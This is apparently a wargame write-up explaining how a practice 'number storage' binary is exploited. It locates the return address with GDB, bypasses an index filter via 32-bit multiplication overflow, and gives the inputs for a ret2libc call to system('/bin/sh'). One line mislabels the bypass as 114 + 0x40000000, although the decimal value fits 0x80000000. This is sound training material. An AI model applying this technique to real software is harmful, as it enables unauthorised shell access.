# Level 07

The binary is a simple number storage service. It lets you store and read unsigned 32-bit integers by index. The goal is to exploit a vulnerability to get a shell as level08.

The program stores numbers in an array of `uint32_t` (4-byte unsigned integers) on the stack.
When you store a number at index N, the program calculates the address like this:

```
address = storage[0] + (N × 4)
```

The `× 4` happens because each slot is 4 bytes wide. In assembly this is a left shift by 2:
**There is no bounds check.** You can give any index and it will write to that memory location — including past the end of the buffer and into the rest of the stack.

When `main` finishes (when you type `quit`), the CPU jumps to whatever address is stored at `ebp + 4`. This is the return address.

Using GDB we can confirm this:

```bash
(gdb) x $ebp+0x4
0xffffd70c:     0xf7e45513

(gdb) b *0x080486ce
Breakpoint 1 at 0x80486ce
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 1
 Index: 1

(gdb) info registers ebx
ebx            0xffffd544 -10940
```

So the return address is stored at `0xffffd70c`. The array starts at `0xffffd544`.

Now lets get the distance in bytes between the array and the return address and convert it to an index:

```
0xffffd70c - 0xffffd544 = 0x1c8 = 456 bytes

456 / 4 = index 114
```

So `array[114]` sits exactly at the return address. If we write `system()` there, the program will call `system()` when `quit` is typed.

When we try to store at index 114:

```
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
```

The program blocks any index where `index % 3 == 0`. Since `114 / 3 = 38` exactly, index 114 is blocked.

The key insight: the `% 3` check happens on the raw index number, but the actual memory write uses `index × 4` in 32-bit arithmetic, which can overflow.

Any multiple of `0x40000000`, when multiplied by 4, overflows perfectly to zero in 32-bit:

```
0x40000000 × 4 = 0x100000000 → overflows to 0x00000000 in 32-bit
0x80000000 × 4 = 0x200000000 → overflows to 0x00000000 in 32-bit
```

So if we add `0x80000000` to our index, the overflow cancels out and we land at the exact same memory address:

```
(114 + 0x80000000) × 4
= 114×4 + 0x80000000×4
= 456   + 0x200000000
= 456   (the 0x200000000 overflows away in 32-bit)
```

The bypass index:

```python
114 + 0x40000000 = 2147483762
```

When `system()` is called, x86 expects the stack to look like this:

```
index 114  →  address of system()     ← return address, CPU jumps here
index 115  →  system()'s return addr  ← where system() returns when done (don't care)
index 116  →  address of "/bin/sh"    ← first argument to system()
```

Checking index 116: `116 % 3 = 2` → not blocked, writable normally ✓

Address of `system()`:

```bash
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0

(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
```

Input these four commands to the binary:

```
Input command: store
 Number: 4159090384       ← address of system()
 Index: 2147483762        ← bypasses block, writes to index 114 (return address)

Input command: store
 Number: 4160264172       ← address of "/bin/sh" in libc
 Index: 116               ← argument slot for system()

Input command: quit       ← triggers return → jumps to system("/bin/sh")
```
